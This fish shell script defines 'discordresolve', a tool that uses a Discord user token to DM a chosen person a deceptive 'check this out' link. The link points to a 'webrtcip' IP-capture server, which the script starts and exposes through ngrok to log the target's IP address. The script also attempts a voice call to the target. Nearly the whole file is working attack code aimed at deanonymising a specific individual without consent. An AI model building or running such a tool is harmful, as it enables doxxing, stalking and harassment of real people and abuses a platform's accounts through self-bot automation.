function discordresolve
    argparse -n discordresolve 't/token=' 'p/port=' 'l/link=' 'm/message=' 'h/help' -- $argv
    or return

    if set -q _flag_help
        echo "Usage: discordresolve -t <token> <target>"
        echo ""
        echo "Sends an IP logger link to a Discord user via DM."
        echo "Target opens the link -> webrtcip captures their IP."
        echo ""
        echo "Arguments:"
        echo "  <target>          User ID (right-click -> Copy ID)"
        echo ""
        echo "Options:"
        echo "  -t <token>        Discord user token"
        echo "  -p <port>         webrtcip port (default: 8080)"
        echo "  -l <url>          Custom link (skip starting webrtcip)"
        echo "  -m <message>      Custom DM text (default: sneaky link)"
        echo ""
        echo "Examples:"
        echo "  discordresolve -t TOKEN 123456789"
        echo "  discordresolve -t TOKEN -p 9999 123456789"
        echo "  discordresolve -t TOKEN -l https://example.com 123456789"
        return
    end

    if test -z "$_flag_token"
        echo (set_color red)"Error: -t <token> is required"(set_color normal)
        return 1
    end
    if test (count $argv) -lt 1
        echo (set_color red)"Error: target user ID required"(set_color normal)
        return 1
    end

    set token $_flag_token
    set target $argv[1]
    set port 8080
    if set -q _flag_port; set port $_flag_port; end
    set msg "hey check this out -> http://localhost:$port/c"
    if set -q _flag_message; set msg $_flag_message; end

    if set -q _flag_link
        set link $_flag_link
    else
        echo (set_color brblack)"    Starting IP capture server on port $port..."(set_color normal)
        webrtcip -p $port &
        set server_pid $last_pid
        sleep 1
        if command -v ngrok &>/dev/null
            echo (set_color brblack)"    Getting ngrok URL..."(set_color normal)
            set link (curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print([t['public_url'] for t in d['tunnels'] if t['proto']=='https'][0])" 2>/dev/null)
            if test -z "$link"
                set link "http://localhost:$port/c"
            end
        else
            set link "http://localhost:$port/c"
        end
        functions -e __cleanup_webrtcip 2>/dev/null
        echo (set_color cyan)"    Capture URL: $link"(set_color normal)
    end

    # Replace {link} placeholder in message
    set msg (string replace '{link}' "$link" -- "$msg")

    echo (set_color cyan)"==> DISCORDRESOLVE"(set_color normal)
    echo (set_color brblack)"    Target: $target"(set_color normal)
    echo (set_color brblack)"    Message length: "(string length -- "$msg")(set_color normal)

    # Run the Python script
    python3 -c "
import json, urllib.request, urllib.error, sys

TOKEN = sys.argv[1]
TARGET = sys.argv[2]
MSG = sys.argv[3]

headers = {
    'Authorization': TOKEN,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0'
}

def api(method, path, data=None):
    url = f'https://discord.com/api/v9/{path}'
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(req)
        return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        print(f'  HTTP {e.code}: {body[:200]}')
        sys.exit(1)
    except Exception as e:
        print(f'  Error: {e}')
        sys.exit(1)

# 1. Verify token
print('  Verifying token...')
me = api('GET', 'users/@me')
print(f'  Logged in as: {me[\"username\"]}#{me.get(\"discriminator\", \"0\")}')

# 2. Get target user info
print(f'  Looking up target...')
target_user = api('GET', f'users/{TARGET}')
print(f'  Target: {target_user[\"username\"]}#{target_user.get(\"discriminator\", \"0\")}')

# 3. Open DM channel
print('  Opening DM channel...')
dm = api('POST', 'users/@me/channels', json.dumps({'recipient_id': TARGET}).encode())
channel_id = dm['id']
print(f'  DM channel: {channel_id}')

# 4. Send message
print('  Sending message...')
api('POST', f'channels/{channel_id}/messages', json.dumps({'content': MSG}).encode())
print(f'  Message sent!')

# 5. Try to start a voice call too
print('  Attempting voice call...')
try:
    call = api('POST', f'channels/{channel_id}/call', json.dumps({'recipients': [TARGET], 'guild_id': None}).encode())
    print(f'  Call started: {json.dumps(call, indent=2)[:200]}')
except:
    print('  Voice call endpoint not available (expected)')
" $token $target "$msg"

    if test -n "$server_pid"
        echo (set_color brblack)"    webrtcip still running (PID $server_pid)"(set_color normal)
        echo (set_color brblack)"    Kill with: kill $server_pid"(set_color normal)
    end
end
